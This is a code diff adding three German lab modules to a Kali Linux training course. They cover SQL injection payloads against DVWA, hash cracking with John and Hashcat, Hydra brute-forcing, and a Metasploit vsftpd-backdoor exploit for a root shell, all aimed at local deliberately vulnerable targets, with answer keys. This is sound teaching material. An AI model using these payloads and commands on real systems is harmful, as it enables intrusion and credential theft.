@@ -72,11 +72,113 @@ export const KALIPRAXIS = [
     ],
     abschluss: 'Drei Welt-Klassiker erlebt: versteckten Bereich gefunden, Login per SQL-Injection umgangen, Zugriffskontrolle per IDOR ausgehebelt. Genau solche Fehler stehen oben in den OWASP Top 10 – und genau danach suchst du bei echten Web-Tests.',
   },
+  {
+    id: 'sqli', icon: '💉', titel: 'SQL-Injection in echt: Datenbank auslesen', stufe: 'Aufbau', team: 'Rot',
+    einleitung: 'SQL-Injection ist die Mutter vieler Daten-Lecks: Eingaben landen ungeprüft in einer Datenbank-Abfrage. Du hebelst zuerst den Filter aus, ziehst dann gezielt Benutzer samt Passwort-Hashes heraus und knackst am Ende einen Hash. Übungsziel ist die DVWA – eine absichtlich verwundbare Lern-App.',
+    ziel: {
+      name: 'DVWA – Damn Vulnerable Web App (Docker)',
+      start: 'docker run --rm -it -p 8080:80 vulnerables/web-dvwa',
+      hinweis: 'Öffne http://localhost:8080 → ganz unten „Create / Reset Database" klicken → mit admin / password anmelden → Reiter „DVWA Security" auf „Low" stellen.',
+      pruef: 'Erscheint links das Menü mit „SQL Injection", bist du startklar.',
+    },
+    schritte: [
+      {
+        id: 'bypass', werkzeug: 'SQL-Injection (Browser)', frage_art: 'abhaken',
+        aufgabe: 'Geh auf „SQL Injection". Statt einer Zahl schiebst du eine immer-wahre Bedingung in das Feld – und bekommst ALLE Datensätze statt nur einem.',
+        befehl: "User ID:  1' OR '1'='1",
+        erwartet: 'Die Seite listet mehrere First-name/Surname-Paare – nicht nur einen Treffer.',
+        frage: 'Mehr als einen Benutzer angezeigt bekommen?', tipp: "Das Hochkomma beendet die Zeichenkette, OR '1'='1' macht die Bedingung immer wahr.",
+      },
+      {
+        id: 'union', werkzeug: 'UNION SELECT', frage_art: 'antwort',
+        aufgabe: 'Zieh über denselben Eingabepunkt gezielt Benutzernamen und Passwort-Hashes aus der Tabelle „users".',
+        befehl: "User ID:  1' UNION SELECT user, password FROM users#",
+        erwartet: 'Zu jedem Benutzer erscheint ein langer 32-Zeichen-Hash (MD5).',
+        frage: 'Wie viele Benutzer-Konten listet die Tabelle?', antwort: ['5'], tipp: 'Zähl die Zeilen mit Hash: admin, gordonb, 1337, pablo, smithy.',
+      },
+      {
+        id: 'crack', werkzeug: 'John the Ripper', frage_art: 'antwort',
+        aufgabe: 'Der Admin-Hash ist unsalziges MD5. Knacke ihn mit einem Wörterbuch – so siehst du, warum schwache Passwörter wertlos sind.',
+        befehl: "echo 5f4dcc3b5aa765d61d8327deb882cf99 > hash.txt\njohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
+        erwartet: 'John zeigt das geknackte Passwort im Klartext an.',
+        frage: 'Wie lautet das Admin-Passwort im Klartext?', antwort: ['password'], tipp: 'Eines der häufigsten Passwörter überhaupt. (rockyou ggf. erst entpacken: gunzip /usr/share/wordlists/rockyou.txt.gz)',
+      },
+    ],
+    abschluss: 'Die komplette SQL-Injection-Kette: Filter aushebeln (OR 1=1) → gezielt Daten ziehen (UNION SELECT) → geklaute Hashes knacken (John). Deshalb sind parametrisierte Abfragen und starke, gesalzene Passwörter Pflicht – du hast live gesehen, was sonst passiert.',
+  },
+  {
+    id: 'passwoerter', icon: '🔑', titel: 'Passwörter in echt: knacken & erraten', stufe: 'Aufbau', team: 'Rot',
+    einleitung: 'Passwort-Angriffe gibt es in zwei Welten: offline knackst du einen geklauten Hash (John, Hashcat) – online rätst du gegen einen echten Login (Hydra). Beides übst du hier lokal. Die ersten beiden Aufgaben brauchen nur Kali selbst, für Hydra nimmst du dieselbe DVWA wie im SQLi-Modul.',
+    ziel: {
+      name: 'DVWA – Brute-Force-Seite (Docker)',
+      start: 'docker run --rm -it -p 8080:80 vulnerables/web-dvwa',
+      hinweis: 'Für die Hydra-Aufgabe: DVWA wie im SQLi-Modul starten (http://localhost:8080 → „Create / Reset Database" → admin/password → Security „Low"). Die beiden Knack-Aufgaben laufen ohne Ziel – nur Kali + das Wörterbuch rockyou.',
+      pruef: 'Für Hydra muss links „Brute Force" erreichbar sein. (rockyou ggf. entpacken: gunzip /usr/share/wordlists/rockyou.txt.gz)',
+    },
+    schritte: [
+      {
+        id: 'md5', werkzeug: 'John the Ripper', frage_art: 'antwort',
+        aufgabe: 'Offline-Angriff: Du hast nur den Hash, brauchst keinen Login. Knacke diesen MD5-Hash mit dem Standard-Wörterbuch rockyou.',
+        befehl: 'echo 0d107d09f5bbe40cade3de5c71e9e9b7 > h1.txt\njohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt h1.txt',
+        erwartet: 'John zeigt nach kurzer Zeit das Klartext-Passwort an.',
+        frage: 'Wie lautet das Passwort?', antwort: ['letmein'], tipp: 'Zwei englische Wörter – „lass mich rein". Später erneut ansehen mit: john --show --format=raw-md5 h1.txt',
+      },
+      {
+        id: 'sha1', werkzeug: 'Hashcat', frage_art: 'antwort',
+        aufgabe: 'Gleiches Spiel mit Hashcat und einem SHA1-Hash. „-m 100" steht für SHA1.',
+        befehl: 'echo 18c28604dd31094a8d69dae60f1bcd347f1afc5a > h2.txt\nhashcat -m 100 h2.txt /usr/share/wordlists/rockyou.txt',
+        erwartet: 'Hashcat zeigt am Ende „hash:klartext".',
+        frage: 'Wie lautet das Passwort?', antwort: ['superman'], tipp: 'Ein Superheld. Ergebnis erneut zeigen mit: hashcat -m 100 h2.txt --show',
+      },
+      {
+        id: 'hydra', werkzeug: 'Hydra (online)', frage_art: 'abhaken',
+        aufgabe: 'Online-Angriff: gegen einen echten Login raten. Ziel ist DVWAs „Brute Force"-Seite. Den Cookie (PHPSESSID + security=low) holst du aus den DevTools (F12 → Application → Cookies).',
+        befehl: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=DEINE_SID; security=low"',
+        erwartet: 'Hydra meldet einen Treffer: login: admin  password: password.',
+        frage: 'Hydra hat das Passwort gefunden?', tipp: 'DEINE_SID durch den echten Wert aus den DevTools ersetzen. Treffer ist admin/password.',
+      },
+    ],
+    abschluss: 'Zwei Welten der Passwort-Angriffe erlebt: offline geklaute Hashes knacken (John, Hashcat), online gegen einen echten Login raten (Hydra). Beides scheitert an langen, einzigartigen Passwörtern und gesalzenen, langsamen Hash-Verfahren – genau das ist die Lehre.',
+  },
+  {
+    id: 'exploit', icon: '🧨', titel: 'Exploitation in echt: erste Shell mit Metasploit', stufe: 'Könner', team: 'Rot',
+    einleitung: 'Vom Finden zum Übernehmen: Metasploit bündelt fertige Exploits. Du nimmst den berühmtesten Einsteiger-Exploit (die vsftpd-2.3.4-Hintertür) gegen die Übungs-Maschine Metasploitable 2 und bekommst eine Root-Shell – ausschließlich im eigenen, abgeschotteten Labor.',
+    ziel: {
+      name: 'Metasploitable 2 (Docker)',
+      start: 'docker run --rm -it -p 21:21 -p 6200:6200 tleemcjr/metasploitable2',
+      hinweis: 'Metasploitable ist absichtlich voller Lücken – NIEMALS ins Internet hängen, nur lokal. Metasploit startest du in einem zweiten Terminal.',
+      pruef: 'nmap -sV -p21 127.0.0.1 zeigt 21/tcp open ftp vsftpd 2.3.4.',
+    },
+    schritte: [
+      {
+        id: 'scan', werkzeug: 'Nmap', frage_art: 'antwort',
+        aufgabe: 'Finde den verwundbaren Dienst: scanne Port 21 und lies die genaue Versionsnummer.',
+        befehl: 'nmap -sV -p21 127.0.0.1',
+        erwartet: '21/tcp open ftp vsftpd 2.3.4',
+        frage: 'Welche vsftpd-Version läuft?', antwort: ['2.3.4', 'vsftpd 2.3.4'], tipp: 'Genau diese Version hat eine eingebaute Hintertür.',
+      },
+      {
+        id: 'use', werkzeug: 'Metasploit', frage_art: 'abhaken',
+        aufgabe: 'Starte Metasploit und lade den passenden Exploit-Baustein gegen das Ziel.',
+        befehl: 'msfconsole -q\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 127.0.0.1\nexploit',
+        erwartet: 'Metasploit meldet „Command shell session 1 opened".',
+        frage: 'Session geöffnet (Shell bekommen)?', tipp: 'Die vsftpd-2.3.4-Hintertür öffnet beim Login einen Shell-Port (6200).',
+      },
+      {
+        id: 'root', werkzeug: 'Shell', frage_art: 'antwort',
+        aufgabe: 'Du bist auf dem Ziel. Prüfe, welche Rechte du hast.',
+        befehl: 'whoami\nid',
+        erwartet: 'Die Ausgabe zeigt root bzw. uid=0.',
+        frage: 'Als welcher Benutzer bist du auf dem Ziel?', antwort: ['root'], tipp: 'Die Hintertür gibt dir die höchsten Rechte – uid=0.',
+      },
+    ],
+    abschluss: 'Die volle Angriffskette: Dienst + Version finden (nmap) → passenden Exploit wählen (Metasploit) → Rechte prüfen (whoami/id). Eine einzige veraltete Version hat gereicht, um Root zu werden. Die Lehre: patchen, patchen, patchen – und immer nur im eigenen Labor üben.',
+  },
 ];
 
 // Noch geplante Module dieses Strangs (werden nach und nach gebaut).
 export const KALIPRAXIS_GEPLANT = [
-  { icon: '💉', titel: 'SQL-Injection in echt (DVWA)' },
-  { icon: '🔑', titel: 'Passwörter in echt: Hydra & John/Hashcat (lokal)' },
-  { icon: '🧨', titel: 'Exploitation in echt: Metasploit gegen eine Übungs-VM' },
+  { icon: '🧗', titel: 'Rechte-Ausweitung: vom Benutzer zu root (linPEAS)' },
+  { icon: '🪟', titel: 'Windows & Active Directory: Grundlagen angreifen' },
+  { icon: '📡', titel: 'WLAN & Netzwerk: mitlesen und knacken (aircrack-ng)' },
 ];
